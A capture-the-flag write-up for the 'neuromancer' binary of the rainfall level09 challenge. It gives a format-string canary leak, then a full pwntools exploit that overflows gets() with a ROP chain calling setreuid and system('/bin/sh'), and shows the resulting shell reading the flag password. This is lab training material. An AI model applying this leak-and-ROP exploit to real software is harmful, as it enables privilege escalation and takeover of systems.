## Infos on the binary

```shell
level09@rainfall:~$ checksec neuromancer
[*] '/home/level09/neuromancer'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```shell
level09@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*20)' | ./neuromancer
  [NEUROMANCER] I am the land of the dead.
  [NEUROMANCER] You should not be here.
[NEUROMANCER] puts@libc: 0x7ffff7c87cc0
[NEUROMANCER] Console handle: [NEUROMANCER] Trace echo: 0x7fffffffe060 (nil) (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20702520 0x403df8 `0xa2b7328e43a5b200` 0x7fffffffe280 0x401722 0xc00000000 0xa2b7328e43a5b200 0x7fffffffe2a0
```

Canary is the 15th argument.

In the `console_handshake` function, there is a printf we can use to leak the canary value, and get it for the payload later.

Then in the `process_input` function, there is a call to `gets` unprotected, allowing us to put a payload in a buffer of 136 bytes, put the canary value, and and overwrite the return address with our rop chain to spawn the shell with the correct rights.

## Solving

```python
from pwn import *

elf = context.binary = ELF('./neuromancer')
p = process('./neuromancer')

p.sendlineafter(b"[NEUROMANCER] Console handle: ", b'%15$p')
p.recvuntil(b'[NEUROMANCER] Trace echo: ')
rep = p.recvline().strip()
canary = int(rep, 16)
print(hex(canary))

payload = b"A" * 136
payload += p64(canary)
payload += b"A" * 8
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1026)             # uid de flag09
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1026)             # uid de flag09
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
payload += b"\n"

p.sendafter(b"[NEUROMANCER] Interface: ", payload)

p.interactive()
```

```bash
python3 test.py
[*] '/home/level09/neuromancer'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './neuromancer': pid 948
0x823aecf4d02a3900
[*] Switching to interactive mode
[NEUROMANCER] Unknown command.
$ whoami
flag09
$ cat /home/flag09/.pass
kl9th7ox72218n3jlf554eymtlaynogo
$ 

```
Got it !